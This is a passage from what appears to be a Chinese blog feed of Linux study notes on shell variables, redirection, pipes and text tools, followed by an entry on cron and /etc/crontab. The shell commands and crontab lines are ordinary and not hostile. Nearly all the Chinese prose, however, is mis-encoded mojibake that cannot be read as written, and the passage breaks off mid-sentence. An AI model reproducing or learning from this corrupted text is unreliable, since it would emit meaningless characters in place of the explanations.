¼ç¬¦)</li><li>å•åŒå¼•å·åŒ…è£¹å†…å®¹åŒºåˆ«ï¼šåŒå¼•å·åŒ…è£¹çš„$å­—ç¬¦å¯ä»¥è§£æå˜é‡ï¼Œå› æ­¤å¯ä»¥æ’å…¥å˜é‡ï¼Œå•å¼•å·å°±æ˜¯çº¯æ–‡æœ¬</li><li>å¯ä»¥ç”¨è½¬ä¹‰å­—ç¬¦è½¬ä¹‰ç‰¹æ®Šå­—ç¬¦</li><li>å˜é‡ååªèƒ½æ˜¯æ•°å­—å­—æ¯ï¼Œä¸èƒ½æ•°å­—å¼€å¤´</li><li>å˜é‡èµ‹å€¼åŒå¼•å·ä¸­å¯ä»¥æ’å…¥å‘½ä»¤<code>$(å‘½ä»¤)</code>ï¼Œå°†å‘½ä»¤æ‰§è¡Œçš„ç»“æœæ’å…¥èµ‹å€¼ä¸­</li><li>å½“è¦åœ¨å­è¿›ç¨‹ä¸­ä½¿ç”¨è¯¥å˜é‡æ—¶ï¼Œ<code>export å˜é‡å</code>ä½¿å…¶å˜æˆç¯å¢ƒå˜é‡<ul><li>ä½†æ˜¯é‡å¯å½“å‰çˆ¶shellçª—å£ååˆä¼šè¢«æ¸…ç©ºï¼Œè‹¥è¦æ°¸ä¹…ä½¿ç”¨ï¼Œè¦åœ¨é…ç½®æ–‡ä»¶ä¸­åŠ exportæˆ–aliasè¯­å¥(zshé…ç½®æ–‡ä»¶ä¸º<code>~/.zshrc</code>æˆ–<code>~/.zprofile</code>),è®¾ç½®ä¸ºè®°å¾—sourceä¸€ä¸‹é…ç½®æ–‡ä»¶</li></ul></li></ul></li><li><p>å–æ¶ˆå˜é‡ <code>unset å˜é‡å</code></p></li></ul><blockquote><p>exit ç¦»å¼€å½“å‰å­è¿›ç¨‹</p><p>åœ¨å½“å‰shellä¸‹ï¼Œå¦å¼€ä¸€ä¸ªshellå°±ç›¸å½“äºå­è¿›ç¨‹ï¼Œçˆ¶è¿›ç¨‹çš„è‡ªå®šä¹‰å˜é‡æ— æ³•åœ¨å­è¿›ç¨‹ä¸­ä½¿ç”¨ï¼Œä½†æ˜¯exportå˜æˆç¯å¢ƒå˜é‡åå°±å¯ä»¥åœ¨å­è¿›ç¨‹ä¸­ä½¿ç”¨</p></blockquote><h3 id="ç¯å¢ƒå˜é‡åŠŸèƒ½"><a href="#ç¯å¢ƒå˜é‡åŠŸèƒ½" class="headerlink" title="ç¯å¢ƒå˜é‡åŠŸèƒ½"></a>ç¯å¢ƒå˜é‡åŠŸèƒ½</h3><p><code>env</code> æŸ¥çœ‹å½“å‰shellç¯å¢ƒå˜é‡ï¼Œå³exportçš„å˜é‡ï¼Œaliasä¸åŒ…æ‹¬å…¶ä¸­</p><p>å¸¸è§ç¯å¢ƒå˜é‡</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HOME  ï½çš„è·¯å¾„</span><br><span class="line">SHELL  å½“å‰shellç¨‹åº</span><br><span class="line">HISTSIZ  æœ€å¤šçºªå½•çš„å†å²å‘½ä»¤æ¡æ•°</span><br><span class="line">MAIL  ä½¿ç”¨mailå‘½ä»¤æ—¶è¯»å–çš„é‚®ç®±æ–‡ä»¶</span><br><span class="line">PATH  æ‰§è¡Œæ–‡ä»¶æŸ¥æ‰¾çš„è·¯å¾„ï¼Œç›®å½•ä¸ç›®å½•é—´ä»¥ : åˆ†éš”ï¼Œè‹¥å·²å®‰è£…çš„å¤–éƒ¨å‘½ä»¤çš„å¯æ‰§è¡Œæ–‡ä»¶æ²¡æœ‰è¢«åŠ å…¥   PATHä¸­ï¼Œä¼šå›æ˜¾`zsh: command not found: aaaa`,åŒæ—¶è‹¥æœ‰åŒåå‘½ä»¤ï¼ŒæŒ‰PATHä¸­çš„é¡ºåº ä½¿ç”¨ç¬¬ä¸€ä¸ª</span><br><span class="line">LANG  è¯­ç³»æ•°æ®</span><br><span class="line">RANDOM  éšæœºæ•°ï¼Œåœ¨bashä¸­æ—¶0~32767,è‹¥è¦ç”Ÿæˆ0~9,ä½¿ç”¨declare </span><br><span class="line">`declare -i number=$RANDOM%10;echo $number`</span><br><span class="line">ä¹Ÿå¯ä»¥</span><br><span class="line">`declare -i number=$RANDOM*10/32768;echo $number`</span><br></pre></td></tr></table></figure></div><blockquote><p>setå‘½ä»¤å¯ä»¥æŸ¥çœ‹æ‰€æœ‰å˜é‡ï¼ˆç¯å¢ƒå˜é‡ä¸è‡ªå®šä¹‰å˜é‡ï¼‰</p></blockquote><h3 id="å˜é‡çš„æµ‹è¯•ä¸æ›¿æ¢"><a href="#å˜é‡çš„æµ‹è¯•ä¸æ›¿æ¢" class="headerlink" title="å˜é‡çš„æµ‹è¯•ä¸æ›¿æ¢"></a>å˜é‡çš„æµ‹è¯•ä¸æ›¿æ¢</h3><p>è¯­æ³•ï¼šnew_var&#x3D;${old_var-content} :ä¸€èˆ¬new_varä¸old_varéƒ½å†™æˆåŒä¸€ä¸ªå˜é‡ï¼Œè¿™æ ·ç›¸å½“äºæµ‹è¯•å˜é‡æ˜¯å¦å­˜åœ¨</p><p><code>username=$&#123;username-root&#125;</code> ï¼šå¦‚æœå˜é‡æ²¡æœ‰è®¾ç½®ï¼ˆå³æ²¡æœ‰è¿™ä¸ªå˜é‡ï¼‰ï¼Œå°±èµ‹å€¼rootï¼Œå¦‚æœè®¾ç½®å°±ä¸æ”¹</p><blockquote><p>å¦‚æœå˜é‡æ˜¯ç©ºå­—ç¬¦ä¸²ï¼Œé‚£ç›´æ¥echoå’Œechoä¸€ä¸ªä¸å­˜åœ¨å˜é‡çš„å†…å®¹æ˜¯ä¸€æ ·çš„ï¼Œå› æ­¤ç›´æ¥echoä¸èƒ½åˆ¤æ–­å˜é‡æ˜¯ä¸æ˜¯å­˜åœ¨</p></blockquote><p>å¦‚æœä¸€å®šè¦ç»™ç©ºå­—ç¬¦ä¸²è®¾ç½®</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new_var=$&#123;old_var:-content&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>åŠ <code>:</code>å,å˜é‡ä¸ºç©ºæˆ–æ˜¯æœªè®¾ç½®éƒ½èƒ½è¢«æ›¿æ¢</p></blockquote><h3 id="è®¾ç½®åˆ«å"><a href="#è®¾ç½®åˆ«å" class="headerlink" title="è®¾ç½®åˆ«å"></a>è®¾ç½®åˆ«å</h3><p>alias</p><p>unalias</p><h3 id="é€šé…ç¬¦ä¸ç‰¹æ®Šç¬¦å·"><a href="#é€šé…ç¬¦ä¸ç‰¹æ®Šç¬¦å·" class="headerlink" title="é€šé…ç¬¦ä¸ç‰¹æ®Šç¬¦å·"></a>é€šé…ç¬¦ä¸ç‰¹æ®Šç¬¦å·</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032334772.jpg"                      alt="image-20220919190354111"                ><figcaption>image-20220919190354111</figcaption></figure></p><h2 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h2><h3 id="é…ç½®æ–‡ä»¶"><a href="#é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®æ–‡ä»¶"></a>é…ç½®æ–‡ä»¶</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032334378.jpg"                      alt="image-20220919185418826"                ><figcaption>image-20220919185418826</figcaption></figure></p><h3 id="è¯»å–"><a href="#è¯»å–" class="headerlink" title="è¯»å–"></a>è¯»å–</h3><p>source é…ç½®æ–‡ä»¶å</p><h3 id="ç¯å¢ƒè®¾ç½®"><a href="#ç¯å¢ƒè®¾ç½®" class="headerlink" title="ç¯å¢ƒè®¾ç½®"></a>ç¯å¢ƒè®¾ç½®</h3><p><code>stty [-a] </code>åˆ—å‡ºæ‰€æœ‰æŒ‰é”®å’Œå…¶å¯¹åº”å†…å®¹</p><p>stty erase [æŒ‰é”®å†…å®¹] è®¾ç½®åˆ é™¤å­—ç¬¦é”®çš„å¿«æ·é”®</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032334549.jpg"                      alt="image-20220919185933635"                ><figcaption>image-20220919185933635</figcaption></figure></p><h2 id="æ•°æ®æµé‡å®šå‘"><a href="#æ•°æ®æµé‡å®šå‘" class="headerlink" title="æ•°æ®æµé‡å®šå‘"></a>æ•°æ®æµé‡å®šå‘</h2><h3 id="gt"><a href="#gt" class="headerlink" title="&gt;"></a>&gt;</h3><p>å‘½ä»¤ &gt; æ–‡ä»¶ ï¼šå°†å‘½ä»¤è¾“å‡ºç»“æœè¾“å…¥åˆ°æ–‡ä»¶ï¼ˆä½†æ˜¯ä¼šè¦†ç›–ï¼‰</p><h3 id="gt-gt"><a href="#gt-gt" class="headerlink" title="&gt;&gt;"></a>&gt;&gt;</h3><p>å‘½ä»¤ &gt;&gt; æ–‡ä»¶ ï¼šå°†å‘½ä»¤è¾“å‡ºç»“æœè¿½åŠ åˆ°æ–‡ä»¶æœ«å°¾</p><blockquote><p><code>&gt;</code>ä¸<code>&gt;&gt;</code>éƒ½ä¼šåœ¨æ–‡ä»¶ä¸å­˜åœ¨æ—¶è‡ªåŠ¨åˆ›å»º</p></blockquote><h3 id="è¾“å‡ºä¸é”™è¯¯è¾“å‡º"><a href="#è¾“å‡ºä¸é”™è¯¯è¾“å‡º" class="headerlink" title="è¾“å‡ºä¸é”™è¯¯è¾“å‡º"></a>è¾“å‡ºä¸é”™è¯¯è¾“å‡º</h3><ul><li>1&gt; ä»¥è¦†ç›–åˆ°æ–¹æ³•å°†æ­£ç¡®çš„æ•°æ®è¾“å‡ºåˆ°æŒ‡å®šçš„æ–‡ä»¶æˆ–è®¾å¤‡ä¸Š</li><li>1&gt;&gt; ä»¥ç´¯åŠ çš„æ–¹æ³•å°†æ­£ç¡®çš„æ•°æ®è¾“å‡ºåˆ°æŒ‡å®šçš„æ–‡ä»¶æˆ–è®¾å¤‡ä¸Š</li><li>2&gt; ä»¥è¦†ç›–åˆ°æ–¹æ³•å°†é”™è¯¯çš„æ•°æ®è¾“å‡ºåˆ°æŒ‡å®šçš„æ–‡ä»¶æˆ–è®¾å¤‡ä¸Š</li><li>2&gt;&gt; ä»¥ç´¯åŠ åˆ°æ–¹æ³•å°†é”™è¯¯çš„æ•°æ®è¾“å‡ºåˆ°æŒ‡å®šçš„æ–‡ä»¶æˆ–è®¾å¤‡ä¸Š</li></ul><blockquote><p>é”™è¯¯çš„æ•°æ®è¾“å‡ºå°±ç›¸å½“äºæŠ¥é”™ä¿¡æ¯</p></blockquote><p>e.g.å°†é”™è¯¯ä¿¡æ¯ä¸¢å¼ƒ</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /home -name .bashrc 2&gt; /dev/null</span><br></pre></td></tr></table></figure></div><blockquote><p>&#x2F;dev&#x2F;nullåƒåœ¾æ¡¶é»‘é“ï¼Œå¯ä»¥åƒæ‰ä»»ä½•ä¼ å…¥ä¿¡æ¯</p></blockquote><p>e.g.å°†é”™è¯¯å’Œæ­£ç¡®ä¿¡æ¯éƒ½å†™åˆ°åŒä¸€ä¸ªæ–‡ä»¶ä¸­</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find /home -name test &gt; list 2&gt;&amp;1</span><br><span class="line">æˆ–</span><br><span class="line">find /home -name test &amp;&gt; list </span><br></pre></td></tr></table></figure></div><h3 id="lt"><a href="#lt" class="headerlink" title="&lt;"></a>&lt;</h3><p>æ¥æ”¶æ–‡ä»¶ &lt; è¾“å…¥æ–‡ä»¶ ï¼šç”¨è¾“å…¥æ–‡ä»¶çš„å†…å®¹æ¥ä»£æ›¿é”®ç›˜è¾“å…¥</p><h3 id="lt-lt"><a href="#lt-lt" class="headerlink" title="&lt;&lt;"></a>&lt;&lt;</h3><p>ç»“æŸè¾“å…¥</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">âœ  desktop cat &gt; catfile &lt;&lt; &quot;eof&quot;</span><br><span class="line"><span class="meta prompt_">heredoc&gt; </span><span class="language-bash">as</span></span><br><span class="line"><span class="meta prompt_">heredoc&gt; </span><span class="language-bash">dsdsds</span></span><br><span class="line"><span class="meta prompt_">heredoc&gt; </span><span class="language-bash">sdsdsd</span></span><br><span class="line"><span class="meta prompt_">heredoc&gt; </span><span class="language-bash">eof</span></span><br></pre></td></tr></table></figure></div><blockquote><p>&lt;&lt;åè·Ÿç»“æŸè¾“å…¥å…³é”®å­—ï¼Œè¿™æ ·å°±ä¸ç”¨ctrl+dæ¥ç»“æŸ</p><p>å•çº¯çš„è¾“å…¥<code>cat &gt; catfile</code>æ¥ç¼–å†™catfileéœ€è¦ctrl+dæ¥ç»“æŸ</p></blockquote><h2 id="ç®¡é“å‘½ä»¤"><a href="#ç®¡é“å‘½ä»¤" class="headerlink" title="ç®¡é“å‘½ä»¤"></a>ç®¡é“å‘½ä»¤</h2><h3 id="è¿æ¥ç¬¦"><a href="#è¿æ¥ç¬¦" class="headerlink" title="è¿æ¥ç¬¦"></a>è¿æ¥ç¬¦</h3><ul><li>;   è¿ç»­å‘½ä»¤æ‰§è¡Œ,<code>cmd;cmd</code></li><li>cmd1 &amp;&amp; cmd2   1æˆåŠŸæ‰§è¡Œä¸”ä¸ºæ­£ç¡®æ‰æ‰§è¡Œ2ï¼Œå¦åˆ™2ä¸æ‰§è¡Œ</li><li>cmd1 || cmd2   1æˆåŠŸæ‰§è¡Œä¸”æ­£ç¡®ï¼Œ2ä¸æ‰§è¡Œï¼Œå¦åˆ™æ‰§è¡Œ2</li></ul><h3 id="ç®¡é“ç¬¦"><a href="#ç®¡é“ç¬¦" class="headerlink" title="ç®¡é“ç¬¦"></a>ç®¡é“ç¬¦</h3><p>cmd1 ï½œ cmd2   cmd1çš„è¾“å‡ºä½œä¸ºcmd2çš„è¾“å…¥ï¼Œç®¡é“ç¬¦ä¼šå¿½ç•¥æŠ¥é”™è¾“å‡º</p><h3 id="é€‰å–å‘½ä»¤"><a href="#é€‰å–å‘½ä»¤" class="headerlink" title="é€‰å–å‘½ä»¤"></a>é€‰å–å‘½ä»¤</h3><ul><li>cut é€‰å–ä¿¡æ¯ä¸­çš„éƒ¨åˆ†<ul><li>cut -d â€˜åˆ†éš”å­—ç¬¦â€™ -f è¾“å‡ºè¡Œæ•°(å¤šè¡Œçš„è¯é€—å·è¿æ¥)</li><li>cut -c å­—ç¬¦èŒƒå›´<ul><li>cut -c 12- å–å¾—ç¬¬12å­—ç¬¦ä»¥åçš„å†…å®¹</li></ul></li></ul></li><li>grep ï¼šæŸ¥æ‰¾å•ä½ä¸ºè¡Œ<ul><li>å¯æ­é…ç®¡é“ç¬¦ <code>cmd | grep &#39;æŸ¥æ‰¾å­—ç¬¦ä¸²&#39;</code> å°†cmdè¾“å‡ºç»“æœä¸­å«æŸ¥æ‰¾å­—ç¬¦çš„éƒ½æ˜¾ç¤ºå‡ºæ¥<ul><li>-a å°†äºŒè¿›åˆ¶æ–‡ä»¶ä»¥textæ–‡ä»¶æ–¹å¼æŸ¥æ‰¾æ•°æ®</li><li>-c è®¡ç®—æ‰¾åˆ°æŸ¥æ‰¾å­—ç¬¦ä¸²çš„æ¬¡æ•°</li><li>-i å¤§å°å†™ä¸æ•æ„Ÿ</li><li>-n è¾“å‡ºæ—¶åŠ ä¸Šè¡Œå·</li><li>-v åå‘é€‰æ‹©ï¼Œæ‰¾ä¸å«æŸ¥æ‰¾å­—ç¬¦ä¸²çš„è¡Œ</li><li>â€“color&#x3D;auto æ‰¾åˆ°çš„å…³é”®å­—éƒ¨åˆ†åŠ ä¸Šé¢œè‰²</li></ul></li></ul></li></ul><h3 id="æ’åºå‘½ä»¤"><a href="#æ’åºå‘½ä»¤" class="headerlink" title="æ’åºå‘½ä»¤"></a>æ’åºå‘½ä»¤</h3><p>sort</p><p>uniq é‡å¤æ•°æ®åªå‡ºç°ä¸€ä¸ª</p><p>wc  ç»Ÿè®¡æ–‡ä»¶å­—ç¬¦æ•°è¡Œæ•°,-l åˆ—å‡ºè¡Œæ•° -w åˆ—å‡ºå­—æ•°ï¼ˆè‹±æ–‡å•å­—ï¼‰ -m å­—ç¬¦æ•°</p><h3 id="åŒå‘é‡å®šå‘"><a href="#åŒå‘é‡å®šå‘" class="headerlink" title="åŒå‘é‡å®šå‘"></a>åŒå‘é‡å®šå‘</h3><p>tee åŒæ—¶å°†æ•°æ®æµä¼ ç»™æ–‡ä»¶ä¸å±å¹•</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tee [-a] file</span><br></pre></td></tr></table></figure></div><p>e.g. å°†æ‰§è¡Œç»“æœè½¬å­˜ä¸€ä»½ï¼ŒåŒæ—¶å±å¹•ä¸Šä¹Ÿå¯ä»¥çœ‹åˆ°</p><p><code>last | tee last.list | cut -d &quot; &quot; -f 1</code></p><h3 id="å­—ç¬¦è½¬æ¢å‘½ä»¤"><a href="#å­—ç¬¦è½¬æ¢å‘½ä»¤" class="headerlink" title="å­—ç¬¦è½¬æ¢å‘½ä»¤"></a>å­—ç¬¦è½¬æ¢å‘½ä»¤</h3><p>tr åˆ é™¤æˆ–æ›¿æ¢</p><p>col å¸¸ç”¨äºå°†man pageè½¬å­˜ä¸ºçº¯æ–‡æœ¬æ–‡ä»¶æ–¹ä¾¿æŸ¥è¯¢</p><p>join åˆå¹¶ä¸¤ä¸ªæ–‡ä»¶(å¯é€‰æ“ä½œå¤š)</p><p>paste ç›´æ¥æ‹¼æ¥ä¸¤ä¸ªæ–‡ä»¶ï¼Œ[tab]éš”å¼€</p><p>expand å°†tabè½¬ç©ºæ ¼</p>]]></content>
      
      
      <categories>
          
          <category> foundation </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linuxå®šæ—¶ä»»åŠ¡</title>
      <link href="/2021/10/07/Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/"/>
      <url>/2021/10/07/Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="Linuxå®šæ—¶ä»»åŠ¡"><a href="#Linuxå®šæ—¶ä»»åŠ¡" class="headerlink" title="Linuxå®šæ—¶ä»»åŠ¡"></a>Linuxå®šæ—¶ä»»åŠ¡</h1><p><a class="link"   href="https://www.jianshu.com/p/f87f17cba27b" >https://www.jianshu.com/p/f87f17cba27b <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="crondç®€ä»‹"><a href="#crondç®€ä»‹" class="headerlink" title="crondç®€ä»‹"></a>crondç®€ä»‹</h2><p>crondè¿›ç¨‹æ¯åˆ†é’Ÿä¼šå®šæœŸæ£€æŸ¥æ˜¯å¦æœ‰è¦æ‰§è¡Œçš„ä»»åŠ¡ï¼Œå¦‚æœæœ‰è¦æ‰§è¡Œçš„ä»»åŠ¡ï¼Œåˆ™è‡ªåŠ¨æ‰§è¡Œè¯¥ä»»åŠ¡ã€‚è¯¥ç³»ç»ŸæœåŠ¡é»˜è®¤å¯åŠ¨ï¼Œlinuxç³»ç»Ÿä¹Ÿæä¾›äº†ä½¿ç”¨è€…æ§åˆ¶è®¡åˆ’ä»»åŠ¡çš„å‘½ä»¤ï¼šcrontabå‘½ä»¤ã€‚</p><h3 id="ç›¸å…³é…ç½®æ–‡ä»¶"><a href="#ç›¸å…³é…ç½®æ–‡ä»¶" class="headerlink" title="ç›¸å…³é…ç½®æ–‡ä»¶"></a>ç›¸å…³é…ç½®æ–‡ä»¶</h3><ul><li><p><code>/var/spool/cron/crontabs/</code> ç›®å½•ä¸‹å­˜æ”¾çš„æ˜¯æ¯ä¸ªç”¨æˆ·åŒ…æ‹¬rootçš„crontabä»»åŠ¡ï¼Œæ¯ä¸ªä»»åŠ¡ä»¥åˆ›å»ºè€…çš„åå­—å‘½åã€‚</p></li><li><p><code>/etc/crontab</code> è¿™ä¸ªæ–‡ä»¶è´Ÿè´£è°ƒåº¦å„ç§ç®¡ç†å’Œç»´æŠ¤ä»»åŠ¡ã€‚</p></li><li><p><code>/etc/cron.d/</code> è¿™ä¸ªç›®å½•ç”¨æ¥å­˜æ”¾ä»»ä½•è¦æ‰§è¡Œçš„crontabæ–‡ä»¶æˆ–è„šæœ¬ã€‚</p></li><li><p>æˆ‘ä»¬è¿˜å¯ä»¥æŠŠè„šæœ¬æ”¾åœ¨<code>/etc/cron.hourly</code>ã€<code>/etc/cron.daily</code>ã€<code>/etc/cron.weekly</code>ã€<code>/etc/cron.monthly</code>ç›®å½•ä¸­ï¼Œè®©å®ƒæ¯å°æ—¶&#x2F;å¤©&#x2F;æ˜ŸæœŸ&#x2F;æœˆæ‰§è¡Œä¸€æ¬¡ã€‚</p></li></ul><h3 id="Linuxä¸‹ä»»åŠ¡è°ƒåº¦"><a href="#Linuxä¸‹ä»»åŠ¡è°ƒåº¦" class="headerlink" title="Linuxä¸‹ä»»åŠ¡è°ƒåº¦"></a>Linuxä¸‹ä»»åŠ¡è°ƒåº¦</h3><ul><li>ç³»ç»Ÿä»»åŠ¡è°ƒåº¦ï¼šç³»ç»Ÿå‘¨æœŸæ€§æ‰€è¦æ‰§è¡Œçš„å·¥ä½œï¼Œæ¯”å¦‚å†™ç¼“å­˜æ•°æ®åˆ°ç¡¬ç›˜ã€æ—¥å¿—æ¸…ç†ç­‰ã€‚<code>/etc/crontab</code>æ–‡ä»¶å°±æ˜¯ç³»ç»Ÿä»»åŠ¡è°ƒåº¦çš„é…ç½®æ–‡ä»¶ã€‚</li><li>ç”¨æˆ·ä»»åŠ¡è°ƒåº¦ï¼šç”¨æˆ·å®šæœŸè¦æ‰§è¡Œçš„å·¥ä½œï¼Œæ¯”å¦‚ç”¨æˆ·æ•°æ®å¤‡ä»½ã€å®šæ—¶é‚®ä»¶æé†’ç­‰ã€‚ç”¨æˆ·å¯ä»¥ä½¿ç”¨ crontab å·¥å…·æ¥å®šåˆ¶è‡ªå·±çš„è®¡åˆ’ä»»åŠ¡ã€‚æ‰€æœ‰ç”¨æˆ·å®šä¹‰çš„crontabæ–‡ä»¶éƒ½è¢«ä¿å­˜åœ¨ <code>/var/spool/cron/crontabs/</code>ç›®å½•ä¸­ï¼Œå…¶æ–‡ä»¶åä¸ç”¨æˆ·åä¸€è‡´ã€‚</li></ul><h2 id="crontabæ–‡ä»¶"><a href="#crontabæ–‡ä»¶" class="headerlink" title="crontabæ–‡ä»¶"></a>crontabæ–‡ä»¶</h2><p>æŸ¥çœ‹<code>/etc/crontab</code>ï¼Œå†…å®¹ä¸ºï¼š</p><div class="highlight-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="comment"># that none of the other crontabs do.</span></span><br><span class="line"></span><br><span class="line"><span class="variable constant_">SHELL</span>=<span class="regexp">/bin/sh</span></span><br><span class="line"><span class="variable constant_">PATH</span>=<span class="regexp">/usr/local</span><span class="regexp">/sbin:/usr</span><span class="regexp">/local/bin</span><span class="symbol">:/sbin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/bin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># m h dom mon dow user  command</span></span><br><span class="line"><span class="number">17</span> *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="line"><span class="number">25</span> <span class="number">6</span>    * * *   root    test -x /usr/sbin/anacron |<span class="params"></span>| ( cd / &amp;&amp; run-parts --report /etc/cron.daily )</span><br><span class="line"><span class="number">47</span> <span class="number">6</span>    * * <span class="number">7</span>   root    test -x /usr/sbin/anacron |<span class="params"></span>| ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br><span class="line"><span class="number">52</span> <span class="number">6</span>    <span class="number">1</span> * *   root    test -x /usr/sbin/anacron |<span class="params"></span>| ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br></pre></td></tr></table></figure></div><p>ç¬¬ä¸€è¡ŒSHELLå˜é‡æŒ‡å®šäº†ç³»ç»Ÿè¦ä½¿ç”¨å“ªä¸ªshellï¼›ç¬¬äºŒè¡ŒPATHå˜é‡æŒ‡å®šäº†ç³»ç»Ÿæ‰§è¡Œ å‘½ä»¤çš„è·¯å¾„ã€‚<br>æ¥ä¸‹æ¥çš„å‘½ä»¤æ ¼å¼ä¸ºï¼š<br><code>m h dom mon dow user command</code><br>è‹±æ–‡å…¨æ‹¼ä¸ºï¼š<br><code>minute hour day month week user commond</code></p><ul><li>minuteï¼šè¡¨ç¤ºåˆ†é’Ÿï¼Œå¯ä»¥æ˜¯ä»0åˆ°59ä¹‹é—´çš„ä»»ä½•æ•´æ•°ã€‚</li><li>hourï¼šè¡¨ç¤ºå°æ—¶ï¼Œå¯ä»¥æ˜¯ä»0åˆ°23ä¹‹é—´çš„ä»»ä½•æ•´æ•°ã€‚</li><li>dayï¼šè¡¨ç¤ºæ—¥æœŸï¼Œå¯ä»¥æ˜¯ä»1åˆ°31ä¹‹é—´çš„ä»»ä½•æ•´æ•°ã€‚</li><li>monthï¼šè¡¨ç¤ºæœˆä»½ï¼Œå¯ä»¥æ˜¯ä»1åˆ°12ä¹‹é—´çš„ä»»ä½•æ•´æ•°ã€‚</li><li>weekï¼šè¡¨ç¤ºæ˜ŸæœŸå‡ ï¼Œå¯ä»¥æ˜¯ä»0åˆ°7ä¹‹é—´çš„ä»»ä½•æ•´æ•°ï¼Œ<u>è¿™é‡Œçš„0æˆ–7ä»£è¡¨æ˜ŸæœŸæ—¥</u>ã€‚</li><li>userï¼šè¡¨ç¤ºç”¨æˆ·ã€‚</li><li>commandï¼šè¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œå¯ä»¥æ˜¯ç³»ç»Ÿå‘½ä»¤ï¼Œä¹Ÿå¯ä»¥æ˜¯è‡ªå·±ç¼–å†™çš„è„šæœ¬æ–‡ä»¶ã€‚</li></ul><blockquote><p> æ³¨æ„<code>/var/spool/cron</code>ç›®å½•ä¸­çš„ç”¨æˆ·è°ƒåº¦ä»»åŠ¡ï¼Œæ²¡æœ‰userä¸€é¡¹ï¼Œå› ä¸ºæ–‡ä»¶åå·²ç»ä»£è¡¨äº†userã€‚</p></blockquote><p>åœ¨ä»¥ä¸Šå„ä¸ªå­—æ®µä¸­ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ç‰¹æ®Šå­—ç¬¦ï¼š</p><ul><li>æ˜Ÿå·ï¼ˆ*ï¼‰ï¼šä»£è¡¨æ‰€æœ‰å¯èƒ½çš„å€¼ï¼Œä¾‹å¦‚monthå­—æ®µå¦‚æœæ˜¯æ˜Ÿå·ï¼Œåˆ™è¡¨ç¤ºåœ¨æ»¡è¶³å…¶å®ƒå­—æ®µçš„åˆ¶çº¦æ¡ä»¶åæ¯æœˆéƒ½æ‰§è¡Œè¯¥å‘½ä»¤æ“ä½œã€‚</li><li>é€—å·ï¼ˆ,ï¼‰ï¼šå¯ä»¥ç”¨é€—å·éš”å¼€çš„å€¼æŒ‡å®šä¸€ä¸ªåˆ—è¡¨èŒƒå›´ï¼Œä¾‹å¦‚ï¼Œâ€œ1,2,5,7,8,9â€</li><li>ä¸­æ ï¼ˆ-ï¼‰ï¼šå¯ä»¥ç”¨æ•´æ•°ä¹‹é—´çš„ä¸­æ 